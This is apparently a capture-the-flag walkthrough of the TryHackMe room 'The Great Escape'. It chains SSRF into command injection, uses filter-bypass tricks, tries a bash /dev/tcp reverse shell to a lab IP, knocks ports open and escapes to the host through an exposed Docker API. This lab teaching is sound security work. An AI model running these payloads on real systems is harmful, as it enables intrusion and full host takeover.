# The Great Escape

![image](https://user-images.githubusercontent.com/5285547/129349152-690fda9a-3458-4f63-9303-f278336f727d.png)

Room link: https://tryhackme.com/room/thegreatescape

## Enum

Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

22/tcp open  ssh?
| fingerprint-strings: 
|   GenericLines: 
|_    m6"<
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    nginx 1.19.6
|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
| http-methods: 
|_  Supported Methods: HEAD
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
|_http-title: docker-escape-nuxt
|_http-trane-info: Problem with XML parsing of /evox/about
```

## Port 80 

Main page

![image](https://user-images.githubusercontent.com/5285547/129352075-939b44a6-fd05-417c-aa06-fb216545fc94.png)

/robots.txt

![image](https://user-images.githubusercontent.com/5285547/129353839-6e377d1b-43c3-487b-95a4-60f78c934ea4.png)

## SSRF

Using the exif-util hint we find another endpoind that is vunerable to SSRF techniques. 

![image](https://user-images.githubusercontent.com/5285547/129355760-44444459-1ed5-4a09-8025-b6327e4e298c.png)

Sending this to burp I tested a few more ports to see what was available internally. 

Intruder setup

![image](https://user-images.githubusercontent.com/5285547/129356016-5a1f90a0-99e3-4f2b-ad25-24a59d1a073a.png)

Results

![image](https://user-images.githubusercontent.com/5285547/129356049-b9984911-5acb-4bb3-ac52-7b9d8aa85e28.png)

I found port 8080 to be open internally. 

Looking at robots.txt again I noticed another hint.

```
# Disallow: /exif-util
Disallow: /*.bak.txt$
```
/exif-util.bak.txt

<details>
  <summary>exif-util.back.txt (Click to open)</summary>
  
  ```html
  <template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

  ```
  
  </details>

This file shows a new endpoint to play with. This must be the call to the internal web app. 
Let's call it to see the response. 

```
http://api-dev-backup:8080/exif
```

Calling the server url, then calling the internal port 8080 with a new URL paramater gave a different response to banned words. 

```
http://10.10.31.233/api/exif?url=http://api-dev-backup:8080/exif?url=/etc/passwd
```

![image](https://user-images.githubusercontent.com/5285547/129357665-816ce4b1-a7d1-4643-b421-e7b0f8e34579.png)

I quickly worked out we can use command injection here to get some results. 

![image](https://user-images.githubusercontent.com/5285547/129362430-5d0d77ba-cc82-45ea-a095-575c51d92182.png)

```
http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la
```

I was still blocked on the banned words. So tried a few tricks from here: https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions

Then I was able to bypass the bad word filter with a simple ''

![image](https://user-images.githubusercontent.com/5285547/129362626-cea87889-6899-4ea1-bfc1-22b9e7c40928.png)

Using this technique I started to enum the system before I attempted to get a reverse shell. 

Bypass chars

```
$IFS   # Spaces
''     # Break a word up

Eg:
exif?url=;cat$IFS/etc/pas''swd
exif?url=;cat${IFS}/etc/pas''swd
```

Further testing and results.

```
Sent: http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;id
Response: uid=0(root) gid=0(root) groups=0(root)

Sent: http://10.10.183.57/api/exif?url=http://api-dev-backup:8080/exif?url=;hostname
Response: api-dev-backup
```

## User 

Doing some more enum on the main url showed some intreseting results. 

```
dirb http://10.10.16.111/ /usr/share/seclists/Discovery/Web-Content/common.txt
```

![image](https://user-images.githubusercontent.com/5285547/129380556-5030cba7-9070-4da2-b4e7-273eff237acd.png)

Curling the request and we get the flag for user. 

![image](https://user-images.githubusercontent.com/5285547/129382555-f91a0ffa-e9b1-4c3b-b980-b99eea1f1f00.png)


## Root (Docker Container)

Time to get on the box to make enumeration easier. 

```
Sent: 
Response: 
```

With this in mind I started to craft a payload that would work to bypass the word filter. 

```
a="ba";b="sh";echo "$a$b -c '$a$b -i >& /dev/tcp/10.8.153.120/9999 0>&1'" 
```

This also failed. Looking again I worked out the its best to close the first command being sent.  
So Curl is the first command to run.   
So null that command with '';   
Now enter any other command. 

```
'';/bin/ba''sh -c "id"
http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';id

 Retrieved Content
               ----------------------------------------
               uid=0(root) gid=0(root) groups=0(root)
```

After many attempts to get a reverse shell I quickly realised it was not going to happen. I then started manual enumeration. 

Knowing we were aready root. I started there. 

![image](https://user-images.githubusercontent.com/5285547/129371290-c23accba-0755-40a1-9d63-efc5ae5232fd.png)

dev-note.txt

```
Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```

Also we note a git repo here too. Lets start to enumerate that too. 

```
http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';cd /root; git log
```

![image](https://user-images.githubusercontent.com/5285547/129371931-2e4be35d-1a53-4439-9a06-2208f518d81a.png)

Lets see the changes on the commit ids. 

```
http://10.10.3.112/api/exif?url=http://api-dev-backup:8080/exif?url='';cd /root; git show 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
```

Aweomse! we get the flag and a hint to open a port for docker tcp. 

![image](https://user-images.githubusercontent.com/5285547/129372213-dac5d8cc-3acc-4c38-9584-4395fc38ef56.png)
---
## Port Knocking (root flag)

Ports to knock. 

```
knock 10.10.3.112 42 1337 10420 6969 63000
```

Before

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

After

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2375/tcp open  docker
```

Now we have a new port open, time to connect and see whats on it. 

Using the info here: https://book.hacktricks.xyz/pentesting/2375-pentesting-docker  
It was easy to enum the target. 

```
curl -s http://10.10.3.112:2375/version | jq
#or
docker -H 10.10.3.112:2375 version
```

```
docker -H 10.10.3.112:2375 images

REPOSITORY                                    TAG       IMAGE ID       CREATED         SIZE
exif-api-dev                                  latest    4084cb55e1c7   7 months ago    214MB
exif-api                                      latest    923c5821b907   7 months ago    163MB
frontend                                      latest    577f9da1362e   7 months ago    138MB
endlessh                                      latest    7bde5182dc5e   7 months ago    5.67MB
nginx                                         latest    ae2feff98a0c   8 months ago    133MB
debian                                        10-slim   4a9cd57610d6   8 months ago    69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   8 months ago    103MB
alpine                                        3.9       78a2ce922f86   15 months ago   5.55MB
```

After trying a few containers, I found one that let me login and had the filesystem for the host on. 

```
docker -H 10.10.3.112:2375 run --rm -it -v /:/host/ nginx chroot /host/ bash
```
![image](https://user-images.githubusercontent.com/5285547/129374037-4be36896-77f9-4c71-a7e3-eb38e24feb9b.png)

Now we can get the real root flag and complete the box. 

